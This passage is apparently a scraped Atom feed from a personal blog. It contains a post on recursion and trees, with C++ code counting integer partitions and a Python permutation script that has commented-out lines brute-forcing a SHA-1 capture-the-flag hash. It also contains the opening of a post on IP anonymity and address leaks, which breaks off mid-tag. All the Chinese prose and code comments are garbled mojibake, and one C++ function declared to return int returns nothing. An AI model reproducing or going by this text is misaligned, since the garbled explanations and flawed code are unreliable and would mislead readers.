      &lt;p&gt;‰ªäÂ§©ÂºÄÂßãÔºåÂõûÂà∞‰ª•ÂæÄÁöÑÂ≠¶‰π†Áä∂ÊÄÅÂêßÔºÅüôÇ&lt;/p&gt;
    
    </summary>
    
      <category term="ÈöèÁ¨î" scheme="http://www.yof3ng.xyz/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="ÈöèÁ¨î" scheme="http://www.yof3ng.xyz/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm_Recursive_Tree</title>
    <link href="http://www.yof3ng.xyz/2019/03/17/Algorithm-Recursive-Tree/"/>
    <id>http://www.yof3ng.xyz/2019/03/17/Algorithm-Recursive-Tree/</id>
    <published>2019-03-17T08:50:11.000Z</published>
    <updated>2019-04-02T08:38:05.737Z</updated>
    
    <content type="html"><![CDATA[<p>üòÑÁÆóÊ≥ïÂ§™Ëèú„ÄÇ<br><a id="more"></a></p><h1 id="Algorithm‚Äî‚ÄîÈÄíÂΩíÊÄùÊÉ≥ÂíåÊ†ë"><a href="#Algorithm‚Äî‚ÄîÈÄíÂΩíÊÄùÊÉ≥ÂíåÊ†ë" class="headerlink" title="Algorithm‚Äî‚ÄîÈÄíÂΩíÊÄùÊÉ≥ÂíåÊ†ë"></a>Algorithm‚Äî‚ÄîÈÄíÂΩíÊÄùÊÉ≥ÂíåÊ†ë</h1><h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p>ÂÄüÂä©‰∏ÄÁÆÄÂçïÁöÑÁÆóÊ≥ïÁ®ãÂ∫èËÆæËÆ°È¢òÊù•ÁÜüÊÇâ<code>ÈÄíÂΩíÊÄùÊÉ≥</code>Âíå<code>ÁÆÄÂçïTree</code>.</p><pre class=" language-c++"><code class="language-c++">È¢òÈù¢‰∏∫ÔºöÁªô‰∏Ä‰∏™Ê≠£Êï¥Êï∞nÔºåÊ±ÇÊúâÂ§öÂ∞ëÁßçÈùû0ÁöÑÊï¥Êï∞ÁªÑÂêà‰πãÂíåÁ≠â‰∫én.‰æãÂ¶ÇÔºö    2=1+1      3=1+1+1      3=1+2</code></pre><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>ÈÄöËøáÊ†ëÂàÜÊîØÁöÑÊñπÂºèÊù•ÂØªÊâæÁ≠îÊ°àÔºåÊ†ëÁöÑÊ†π<code>root=1</code>ÔºåÁÑ∂ÂêéÈÄêÊ∏êÂæ™ÁéØËé∑ÂèñÊØè‰∏™ÂàÜÊîØ‰πãÂíå‰∏∫nÔºåÂ∞è‰∫énÂàôÁªßÁª≠Êâ©Â±ï„ÄÇ</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190317161546.png" alt=""></p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span> </span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;vector></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;set></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span> tree<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token keyword">int</span> head<span class="token punctuation">,</span><span class="token keyword">int</span> result<span class="token punctuation">,</span>string treeone<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>result<span class="token operator">-</span>head<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token operator">&lt;</span>result<span class="token punctuation">)</span><span class="token punctuation">{</span>            string treetmp <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">di_gui</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token punctuation">,</span>result<span class="token punctuation">,</span>treetmp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;"dian"&lt;&lt;endl;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            string treetmp2 <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp2<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            tree<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>treetmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;flag&lt;&lt;endl;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>string <span class="token function">sort_string</span><span class="token punctuation">(</span>string it<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> arrchr<span class="token punctuation">[</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    string tmp <span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        arrchr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>arrchr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>arrchr<span class="token punctuation">[</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        tmp <span class="token operator">+</span><span class="token operator">=</span> arrchr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span>set<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">get_set</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span> atree<span class="token punctuation">)</span><span class="token punctuation">{</span>    set<span class="token operator">&lt;</span>string<span class="token operator">></span> tmp<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>atree<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        tmp<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token function">sort_string</span><span class="token punctuation">(</span>atree<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span>    <span class="token keyword">int</span> head<span class="token punctuation">;</span>    cin<span class="token operator">>></span>num<span class="token punctuation">;</span>    <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span>flag<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//ÂéªÈáçÂ§ÑÁêÜ </span>    set<span class="token operator">&lt;</span>string<span class="token operator">></span> result <span class="token operator">=</span> <span class="token function">get_set</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">auto</span> it<span class="token operator">=</span>result<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>it<span class="token operator">!=</span>result<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>it<span class="token punctuation">)</span><span class="token punctuation">{</span>        cout<span class="token operator">&lt;&lt;</span><span class="token operator">*</span>it<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//    for(int i=0;i&lt;tree.size();++i){</span><span class="token comment" spellcheck="true">//        cout&lt;&lt;tree.at(i)&lt;&lt;endl;</span><span class="token comment" spellcheck="true">//    }</span><span class="token punctuation">}</span></code></pre><p>ÂèØ‰ª•ÁúãÂà∞flagÂèòÈáèÂØπÂ∫îÁöÑÂ∞±ÊòØTreeÁöÑÂàÜÊîØÊÄªÊï∞ÔºåËÄåÈ¢òÁõÆË¶ÅÊ±ÇÁöÑÊòØÊ≤°ÊúâÈáçÂ§çÁªÑÂêàÁöÑÁªìÊûúÔºåÂú®Ê†ëÁöÑÂàÜÊîØ‰∏≠Â≠òÂú®ÈáçÂ§çÁöÑËäÇÁÇπÔºå‰æãÂ¶ÇÊàë‰ª¨Ë¶ÅËé∑Âæó<code>n=5</code>ÁöÑÁªìÊûúÔºåÈÇ£‰πà<code>1-3-1</code>Âíå<code>1-1-3</code>‰∏§‰∏™ÂàÜÊîØÂ∞±‰∫ßÁîü‰∫ÜÈáçÂ§çÔºåÊ≠§Êó∂ÂØπÊ†ëÁöÑÂàÜÊîØËøõË°åÁªìÁÇπÊéíÂ∫èÔºåÁÑ∂ÂêéÈÄöËøáÈõÜÂêàÂéªÈáçÔºåËøôÊó∂ÂæóÂà∞ÁöÑÊâçÊòØÁúüÊ≠£ÁöÑÁªìÊûú„ÄÇ</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190317162524.png" alt=""></p><p>Â¶ÇÊûú<code>di_gui</code>‰∏çÁî®ÂÖ®Â±ÄÂèòÈáèflagÁöÑËØùÔºåÂèØ‰ª•ÊääflagÊîæÂÖ•ÊñπÊ≥ï‰∏≠Ôºö</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token keyword">int</span> head<span class="token punctuation">,</span><span class="token keyword">int</span> result<span class="token punctuation">,</span>string treeone<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>result<span class="token operator">-</span>head<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token operator">&lt;</span>result<span class="token punctuation">)</span><span class="token punctuation">{</span>            string treetmp <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">+</span><span class="token operator">=</span><span class="token function">di_gui</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token punctuation">,</span>result<span class="token punctuation">,</span>treetmp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;"dian"&lt;&lt;endl;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            string treetmp2 <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp2<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            tree<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>treetmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;flag&lt;&lt;endl;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Êâ©Â±ï"><a href="#Êâ©Â±ï" class="headerlink" title="Êâ©Â±ï"></a>Êâ©Â±ï</h2><p>PythonÁâàÂõ∫ÂÆöÈïøÂ∫¶ÁöÑÂ≠óÁ¨¶‰∏≤ÊéíÂàóÁªÑÂêàÔºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">perm</span><span class="token punctuation">(</span>s<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># ËøôÈáåÊòØÈÄíÂΩíÂáΩÊï∞ÁöÑÂá∫Âè£Ôºå‰∏∫‰ªÄ‰πàÂë¢ÔºåÂõ†‰∏∫ËøôÈáåË°®Á§∫Ôºö‰∏Ä‰∏™ÈïøÂ∫¶‰∏∫1ÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÂÆÉÁöÑÊéíÂàóÁªÑÂêàÂ∞±ÊòØÂÆÉËá™Â∑±„ÄÇ</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>s<span class="token punctuation">]</span>    sl<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#‰øùÂ≠òÂ≠óÁ¨¶‰∏≤ÁöÑÊâÄÊúâÂèØËÉΩÊéíÂàóÁªÑÂêà</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#Ëøô‰∏™Âæ™ÁéØÔºåÂØπÂ∫î Ëß£È¢òÊÄùË∑Ø1ÔºâÁ°ÆÂÆöÂ≠óÁ¨¶‰∏≤ÁöÑÁ¨¨‰∏Ä‰∏™Â≠óÊØçÊòØË∞ÅÔºåÊúânÁßçÂèØËÉΩÔºàn‰∏∫Â≠óÁ¨¶‰∏≤sÁöÑÈïøÂ∫¶</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> perm<span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#Ëøô‰∏™Âæ™ÁéØÔºåÂØπÂ∫î Ëß£È¢òÊÄùË∑Ø2ÔºâËøõÂÖ•ÈÄíÂΩíÔºås[0:i]+s[i+1:]ÁöÑÊÑèÊÄùÂ∞±ÊòØÊääs‰∏≠ÁöÑs[i]ÁªôÂéªÊéâ</span>            sl<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ÂØπÂ∫î Ëß£È¢òÊÄùË∑Ø2ÔºâÈóÆÈ¢òÂ∞±‰ªé‚ÄúËøîÂõûÂ≠óÁ¨¶‰∏≤‰∏≠ÁöÑÂ≠óÊØçÊéíÂàóÁªÑÂêà‚Äù **ÂèòÊàê‰∫Ü** ‚ÄúËøîÂõû Á¨¨‰∏Ä‰∏™Â≠óÊØç+Èô§ÂéªÁ¨¨‰∏Ä‰∏™Â≠óÊØçÂ§ñÁöÑÂ≠óÁ¨¶‰∏≤ÁöÑÊéíÂàóÁªÑÂêà‚Äù</span>    <span class="token keyword">return</span> sl<span class="token keyword">def</span> <span class="token function">sha1</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>    hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>str<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># dict0 = '12eshcn'</span>    <span class="token comment" spellcheck="true"># dict1 = '!2eshcn'</span>    <span class="token comment" spellcheck="true"># dict2 = '!@eshcn'</span>    <span class="token comment" spellcheck="true"># dict3 = '1@eshcn'</span>    dicts <span class="token operator">=</span> <span class="token string">''</span><span class="token comment" spellcheck="true">#Ë¶ÅÊéíÂàóÁªÑÂêàÁöÑÂ≠óÁ¨¶</span>    perm_nums<span class="token operator">=</span>perm<span class="token punctuation">(</span>dicts<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>perm_nums<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># for key in perm_nums:</span>    <span class="token comment" spellcheck="true">#      flag = "flag{%s}"%key</span>    <span class="token comment" spellcheck="true">#      if str(sha1(flag)) == "e6079c5ce56e781a50f4bf853cdb5302e0d8f054":</span>    <span class="token comment" spellcheck="true">#          print(flag)</span></code></pre><p>ÂêåÊ†∑ÊòØÈÄíÂΩíÔºãTreeÁöÑÊñπÊ≥ïËé∑ÂèñÂà∞ÁªìÊûú„ÄÇ</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;üòÑÁÆóÊ≥ïÂ§™Ëèú„ÄÇ&lt;br&gt;
    
    </summary>
    
      <category term="Algorithm" scheme="http://www.yof3ng.xyz/categories/Algorithm/"/>
    
    
      <category term="Algorithm" scheme="http://www.yof3ng.xyz/tags/Algorithm/"/>
    
      <category term="Tree" scheme="http://www.yof3ng.xyz/tags/Tree/"/>
    
  </entry>
  
  <entry>
    <title>IPÂåøÂêçÊÄßÁ†îÁ©∂</title>
    <link href="http://www.yof3ng.xyz/2019/02/21/IP%E5%8C%BF%E5%90%8D%E6%80%A7%E7%A0%94%E7%A9%B6/"/>
    <id>http://www.yof3ng.xyz/2019/02/21/IPÂåøÂêçÊÄßÁ†îÁ©∂/</id>
    <published>2019-02-21T12:06:12.000Z</published>
    <updated>2019-04-02T08:39:40.080Z</updated>
    
    <content type="html"><![CDATA[<p>IPÂåøÂêçÊÄßÁ†îÁ©∂‚Äî‚ÄîAnonymity</p><a id="more"></a><h1 id="IPÂåøÂêçÊÄßÁ†îÁ©∂‚Äî‚ÄîAnonymity"><a href="#IPÂåøÂêçÊÄßÁ†îÁ©∂‚Äî‚ÄîAnonymity" class="headerlink" title="IPÂåøÂêçÊÄßÁ†îÁ©∂‚Äî‚ÄîAnonymity"></a>IPÂåøÂêçÊÄßÁ†îÁ©∂‚Äî‚ÄîAnonymity</h1><h2 id="‰ΩïË∞ìÂåøÂêçÔºü"><a href="#‰ΩïË∞ìÂåøÂêçÔºü" class="headerlink" title="‰ΩïË∞ìÂåøÂêçÔºü"></a>‰ΩïË∞ìÂåøÂêçÔºü</h2><blockquote><p>ÂåøÂêçÂÆö‰πâ‰∏∫<strong>Êú™Áü•ÂßìÂêçÊàñÊú™Á°ÆÂÆöË∫´‰ªΩ</strong>„ÄÇÊàë‰ª¨‰∏äÁΩëÊó∂Âπ∂Ê≤°ÊúâÂåøÂêçÔºåÂç≥‰ΩøÂú®‰ΩøÁî®ÈöêÁßÅÂ∑•ÂÖ∑Â¶ÇTor„ÄÅBitcoinÊàñVPNÁöÑÊó∂ÂÄô„ÄÇÊØèÈ°πÊúçÂä°Ëá≥Â∞ëÊúâ‰∏ÄÊù°ÂèØ‰ª•Áî®‰∫éÂå∫ÂàÜ‰∏çÂêåÁî®Êà∑ÁöÑ‰ø°ÊÅØÔºåÊó†ËÆ∫ÂÖ∂‰∏∫‰∏ÄÂ•óIPÂú∞ÂùÄÔºàVPNÊàñTorÔºâËøòÊòØ‰∏Ä‰∏™ÁîµÂ≠êÈí±ÂåÖÔºàBitcoinÔºâ„ÄÇËøôÁßç‰ø°ÊÅØÊú¨Ë∫´ÂèØËÉΩ‰∏ç‰ºöÊ≥ÑÈú≤Áî®Êà∑ÁöÑ‰ªª‰ΩïÁßÅ‰∫∫‰ø°ÊÅØÔºå‰ΩÜÂÖ∂ÂèØ‰∏éÂÖ∂ÂÆÉÁõ∏‰ºº‰ø°ÊÅØËÅîÁ≥ªËµ∑Êù•ÔºåÊúÄÁªàÁ°ÆÂÆö‰∏™‰∫∫ÁöÑË∫´‰ªΩ„ÄÇ</p><p>VPNËôΩÁÑ∂‰∏ç‰ºö‰ΩøÂæóÊàë‰ª¨ÂÆåÂÖ®ÂåøÂêçÔºå‰ΩÜÂÆÉ‰ºöÊûÅÂ§ßÂ¢ûÂº∫‰∏äÁΩëÊó∂ÁöÑÈöêÁßÅÂíåÂÆâÂÖ®„ÄÇ</p></blockquote><p>Êó¢ÁÑ∂‰∏çÂèØËÉΩÂÅöÂà∞ÂÆåÂÖ®ÂåøÂêçÔºåÊàë‰ª¨Âè™ËÉΩÊèêÈ´òÁõ∏ÂØπÂåøÂêçÊÄßÔºå‰ªéËÄå‰ΩøÂæóËá™Â∑±Âú®ÁΩëÁªú‰∏≠ÁöÑ<strong>ÈöêÁßÅÂ∫¶Êõ¥È´ò</strong>Ôºå<strong>ÂÆâÂÖ®ÊÄßÊõ¥È´ò</strong>„ÄÇ</p><h2 id="‰∏ÄÂÆöÁöÑÂåøÂêçÊÄßÊòØÊúâÂøÖË¶ÅÁöÑ"><a href="#‰∏ÄÂÆöÁöÑÂåøÂêçÊÄßÊòØÊúâÂøÖË¶ÅÁöÑ" class="headerlink" title="‰∏ÄÂÆöÁöÑÂåøÂêçÊÄßÊòØÊúâÂøÖË¶ÅÁöÑ"></a>‰∏ÄÂÆöÁöÑÂåøÂêçÊÄßÊòØÊúâÂøÖË¶ÅÁöÑ</h2><p>‰∫íËÅîÁΩëÊó∂‰ª£Ôºå‰∏™‰∫∫ÈöêÁßÅÁöÑ‰øùÊä§Êõ¥Âä†Â§çÊùÇ‰∏éÂõ∞ÈöæÔºå‰∫üÂæÖÂêÑÁßç‰øùÊä§ÊâãÊÆµÁöÑÊõ¥Êñ∞ÂíåÂàõÊñ∞„ÄÇÊØîÂ¶ÇÂú®ÁΩëÁªúÁ´ãÊ≥ïÂ±ÇÈù¢ÔºåÁõÆÂâç‰ªçÊúâËÆ∏Â§öÁ©∫ÁôΩÔºåÁº∫‰πèÁõ∏Â∫îÁöÑÈ°∂Â±ÇËÆæËÆ°„ÄÇÊúâÂøÖË¶ÅÂú®‰∏™‰∫∫‰ø°ÊÅØ‰øùÊä§„ÄÅÁîµÂ≠êÂïÜÂä°Á≠âÈ¢ÜÂüüÂª∫Á´ã‰∏•Ê†ºÂÅ•ÂÖ®ÁöÑÊ≥ïÂæãËßÑÂÆöÔºåÂàíÂÆö‰∫íËÅîÁΩëÊúçÂä°ÂïÜÁöÑ‚ÄúÁ¶ÅÂå∫‚ÄùÔºåÊòéÁ°ÆÊùÉË¥£ÔºåËÆ©Â§ÑÂú®Âº±ÂäøÁöÑÊôÆÈÄöÁî®Êà∑Êã•ÊúâÁü•ÊÉÖÊùÉ„ÄÅÈÄâÊã©ÊùÉ‰∏éÁª¥ÊùÉÁöÑ‰æùÊçÆ„ÄÇ</p><p>Âõ†ËÄåÂú®ÂΩì‰ªäËøô‰∏™Êó∂‰ª£Ôºå‰∏çËÆ∫ÊòØ‰ø°ÊÅØ/ÁΩëÁªúÂÆâÂÖ®‰ªé‰∏öËÄÖÔºåËøòÊòØÊôÆÈÄöÁæ§‰ºóÈÉΩÂ∫îËØ•Ëá™‰∏ªÂú∞ÂéªÊèêÈ´òËá™Â∑±ÁöÑÂÆâÂÖ®ÊÑèËØÜÔºåÈÄöËøá‰∏Ä‰∫õÊé™ÊñΩÈò≤Ê≠¢Ëá™Â∑±ÁöÑ‰ø°ÊÅØÊ≥ÑÈú≤„ÄÇ</p><h2 id="‰ªÄ‰πàÂõ†Á¥†‰ºöÊ≥ÑÈú≤‰Ω†ÁöÑÁúüÂÆûIP‰ø°ÊÅØÔºü"><a href="#‰ªÄ‰πàÂõ†Á¥†‰ºöÊ≥ÑÈú≤‰Ω†ÁöÑÁúüÂÆûIP‰ø°ÊÅØÔºü" class="headerlink" title="‰ªÄ‰πàÂõ†Á¥†‰ºöÊ≥ÑÈú≤‰Ω†ÁöÑÁúüÂÆûIP‰ø°ÊÅØÔºü"></a>‰ªÄ‰πàÂõ†Á¥†‰ºöÊ≥ÑÈú≤‰Ω†ÁöÑÁúüÂÆûIP‰ø°ÊÅØÔºü</h2><p>ÂèØ‰ª•Â∞èÁªìÂá∫‰ª•‰∏ãÂõ†Á¥†Ôºö</p><ul><li>IPV4Âú∞ÂùÄÊ≥ÑÈú≤</li><li>IPV6Âú∞ÂùÄÊ≥ÑÈú≤</li><li>DNSÊ≥ÑÈú≤</li><li>WebRTCÊ≥ÑÈú≤</li><li>HTTPHeader‰ø°ÊÅØÊ≥ÑÈú≤</li><li>Á≠âÁ≠â‚Ä¶..</li></ul><h3 id="IPV4Ê≥ÑÈú≤"><a href="#IPV4Ê≥ÑÈú≤" class="headerlink" 